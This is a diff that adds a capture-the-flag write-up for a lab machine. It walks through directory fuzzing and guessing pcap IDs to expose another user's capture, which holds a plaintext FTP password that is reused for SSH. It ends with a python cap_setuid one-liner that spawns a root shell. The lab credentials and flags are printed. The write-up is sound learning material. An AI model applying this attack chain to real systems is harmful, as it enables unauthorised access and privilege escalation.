@@ -78,3 +78,163 @@ PORT   STATE SERVICE VERSION
 ```
 
 Some little ports (21,22, 80), lets start with the **ftp** one. <br>
+
+Trying **anonymous** login and looking for **CVE's** didn't pay off <br>
+
+Lets check the web app ! <br>
+
+There's a couple of menus:
+- Dashboard: nothing interesting
+- Security snapshot: creates a capture file (.pcap) for 5 seconds and gives its download link
+- IP config: interfaces information
+- Network status: shows the machine's connections and their states
+
+From the **network status** menu we can assume that there are no other open ports at higher numbers
+```bash
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN 
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN  
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN 
+
+# -- snip --
+
+tcp6       0      0 :::21                   :::*                    LISTEN
+tcp6       0      0 :::22                   :::*                    LISTEN 
+``` 
+
+By checking the requests/responses i was not able to identify any potential attack vector, so i'll pivot to some more testing <br>
+
+Lets start with a directory bruteforcing/fuzzing! 
+```bash
+cmd: gobuster dir -u http://10.10.10.245 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o fuzz/big.log -t 80
+
+/capture              (Status: 302) [Size: 224] [--> http://10.10.10.245/data/109]
+/data                 (Status: 302) [Size: 208] [--> http://10.10.10.245/]        
+/ip                   (Status: 200) [Size: 17465]                                 
+/netstat              (Status: 200) [Size: 48119]
+```
+
+So we got pretty much what was available through the menu but an interestng thing is that the **/capture** consists of **data** in its path with an ID for a **.pcap** file <br>
+
+Let's fuzz **/data** to see if we can access other .pcaps <br>
+
+```bash
+cmd: gobuster dir -u http://10.10.10.245/data/ -w /usr/share/seclists/Discovery/Web-Content/data.big.txt -o fuzz/big.log -t 80 -b 302,404
+
+/110                  (Status: 200) [Size: 17146]                                                
+/00000000             (Status: 200) [Size: 17147]                                                
+/001                  (Status: 200) [Size: 17144]                                                
+/0001                 (Status: 200) [Size: 17144]                                                
+/002                  (Status: 200) [Size: 17144]                                                
+/0007                 (Status: 200) [Size: 17144]                                                
+/000000               (Status: 200) [Size: 17147]                                                
+/101                  (Status: 200) [Size: 17146]                                                
+/102                  (Status: 200) [Size: 17146]                                                
+/02                   (Status: 200) [Size: 17144]
+# -- snip -- (130 results)
+```
+
+We can see that the ones with all **00's** have the biggest size, lets check them ! To access the .pcap we need to access the **../data/00000000** path and download it <br>
+
+Within the .pcap we can see several protocols being used, but one is particularly interesting: **FTP** <br>
+
+If we use **wireshark's follow tcp stream** feature, we can see the whole ftp communication
+```sql
+220 (vsFTPd 3.0.3)
+USER nathan
+331 Please specify the password.
+PASS Buck3tH4TF0RM3!
+230 Login successful.
+SYST
+215 UNIX Type: L8
+PORT 192,168,196,1,212,140
+200 PORT command successful. Consider using PASV.
+LIST
+150 Here comes the directory listing.
+226 Directory send OK.
+PORT 192,168,196,1,212,141
+200 PORT command successful. Consider using PASV.
+LIST -al
+150 Here comes the directory listing.
+226 Directory send OK.
+TYPE I
+200 Switching to Binary mode.
+PORT 192,168,196,1,212,143
+200 PORT command successful. Consider using PASV.
+RETR notes.txt
+550 Failed to open file.
+QUIT
+221 Goodbye.
+``` 
+
+And we got some creds here! ```nathan:Buck3tH4TF0RM3!```, lets check the ftp server <br>
+
+The FTP server is mapped, as it seems, to the user's home folder... Spicy :D
+```bash
+ftp-cmd > ls -la
+
+drwxr-xr-x    5 1001     1001         4096 Jun 16 10:11 .
+drwxr-xr-x    3 0        0            4096 May 23 19:17 ..
+lrwxrwxrwx    1 0        0               9 May 15 21:40 .bash_history -> /dev/null
+-rw-r--r--    1 1001     1001          220 Feb 25  2020 .bash_logout
+ -rw-r--r--    1 1001     1001         3771 Feb 25  2020 .bashrc
+drwx------    2 1001     1001         4096 May 23 19:17 .cache
+drwx------    4 1001     1001         4096 Jun 16 10:11 .gnupg
+-rw-r--r--    1 1001     1001          807 Feb 25  2020 .profile
+lrwxrwxrwx    1 0        0               9 May 27 09:16 .viminfo -> /dev/null
+drwxr-xr-x    3 1001     1001         4096 Jun 16 10:10 snap
+-r--------    1 1001     1001           33 Jun 16 10:06 user.txt
+
+ftp-cmd > get user.txt
+# FLAG: fabfa5b2c0439e4b1a6f34f144f22248
+```
+
+Since i was not finding anything else (interesting), i tried ssh with the same creds and we got **credentials reuse** :D <br>
+
+Now, after i ran **linpeas**, i had not much interesting information/leads besides this
+
+```sql
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+```
+
+Since we had little to no information, i went on checking if the application had any type of hidden features <br>
+
+Reading through it is pretty easy, the code isn't that badly written, and we can find intersting things
+```py
+"""This is a snip from the /var/www/html/app.py file"""
+
+@app.route("/capture")
+@limiter.limit("10 per minute")
+def capture():
+    get_lock()
+    pcapid = get_appid()
+    increment_appid()
+    release_lock()
+    path = os.path.join(app.root_path, "upload", str(pcapid) + ".pcap")
+    ip = request.remote_addr
+    # permissions issues with gunicorn and threads. hacky solution for now.
+    #os.setuid(0)
+    #command = f"timeout 5 tcpdump -w {path} -i any host {ip}"
+    command = f"""python3 -c 'import os; os.setuid(0); os.system("timeout 5 tcpdump -w {path} -i any host {ip}")'"""
+    os.system(command)
+    #os.setuid(1000) 
+    return redirect("/data/" + str(pcapid))
+                                              
+```
+
+My initial idea was to spoof the request's ip address and inject into the **command** via the **id = request.remote_addr**. No success ! <br>
+
+But, as we can see, the command uses **os.setuid(0)** to execute as root (since the app.py belongs to the user nathan and tcpdump needs root privileges) <br>
+
+If we just searched for what we found in linpeas we would came to the same conclusion, python with the **cap_setuid** is able to change the UID of the process <br>
+
+With this, we can exploit python's configuration in order to privesc with a simple one-liner
+```bash
+cmd: python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+cmd: whoami && id
+root
+uid=0(root) gid=1001(nathan) groups=1001(nathan)
+cmd: cat /root/root.txt
+# FLAG: e81e33c4b122d5773df0d668843e0a00
+```
+
